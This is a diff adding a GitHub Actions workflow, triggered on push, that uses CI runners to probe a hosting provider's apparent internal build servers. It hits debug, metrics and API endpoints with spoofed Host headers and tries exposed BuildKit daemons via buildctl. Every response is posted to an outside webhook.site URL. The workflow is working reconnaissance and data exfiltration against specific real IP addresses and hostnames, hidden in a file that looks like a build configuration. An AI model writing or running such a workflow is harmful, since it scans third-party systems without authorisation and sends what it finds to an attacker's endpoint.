@@ -1,0 +1,48 @@
+name: fsn1net2
+on: [push, workflow_dispatch]
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: probes
+        run: |
+          python3 - <<'PY'
+          import subprocess,urllib.request
+          W="https://webhook.site/eb5afbe6-11c3-477e-9274-91dd0d3b2a60"
+          def send(part,data):
+              try: urllib.request.urlopen(W+"?part="+part,data=str(data).encode(),timeout=10)
+              except Exception: pass
+          def curl(args):
+              try: return subprocess.run(["curl","-sS","-m","8"]+args,capture_output=True,text=True).stdout
+              except Exception as e: return "ERR "+repr(e)
+          for name,base,host in [("b1","http://116.202.217.236","builder-01.fsn1.ger.sliplane.io"),("b2","http://188.40.98.155","builder-02.fsn1.ger.sliplane.io")]:
+            for path in ["/","/health","/healthz","/version","/metrics","/debug/pprof/","/debug/vars","/api","/v1/builds","/status","/grpc"]:
+              o=curl(["-i","-H","Host: "+host,base+path])
+              send("h1",f"== {host}{path}\n{o[:600]}")
+          for h in ["localhost","127.0.0.1","sliplane.io","builder-01","gateway-01.fsn1.ger.sliplane.io"]:
+            o=curl(["-i","-H","Host: "+h,"http://116.202.217.236/"])
+            send("hv",f"== Host {h}\n{o[:400]}")
+          for u in ["http://116.202.6.71/","https://116.202.6.71/","http://116.202.6.71:10033/","http://116.202.6.71:22222/"]:
+            o=curl(["-k","-i",u]); send("t71",f"== {u}\n{o[:600]}")
+          for h in ["t13pub.sliplane.app","open-webui-4yy2.sliplane.app"]:
+            o=curl(["-k","-i","-H","Host: "+h,"https://116.202.6.71/"]); send("t71h",f"== {h}\n{o[:600]}")
+          o=curl(["-6","-i","-m","5","https://fsn1-registry.sliplane.io/v2/"])
+          send("v6",f"== ipv6 fsn1-registry\n{o[:300]}")
+          send("done2","ok")
+          PY
+      - name: buildctl
+        if: always()
+        run: |
+          curl -sSL -m 60 -o /tmp/bk.tgz https://github.com/moby/buildkit/releases/download/v0.16.0/buildkit-v0.16.0.linux-amd64.tar.gz
+          tar -xzf /tmp/bk.tgz -C /tmp
+          python3 - <<'PY'
+          import subprocess,urllib.request
+          W="https://webhook.site/eb5afbe6-11c3-477e-9274-91dd0d3b2a60"
+          def send(part,data):
+              try: urllib.request.urlopen(W+"?part="+part,data=str(data).encode(),timeout=10)
+              except Exception: pass
+          for addr in ["tcp://116.202.217.236:1234","tcp://116.202.217.236:8080","tcp://188.40.98.155:1234","tcp://188.245.195.191:1234"]:
+              o=subprocess.run(["timeout","20","/tmp/bin/buildctl","--addr",addr,"debug","workers"],capture_output=True,text=True)
+              send("bk",f"== {addr} rc={o.returncode}\nOUT:{o.stdout[:400]}\nERR:{o.stderr[:500]}")
+          PY
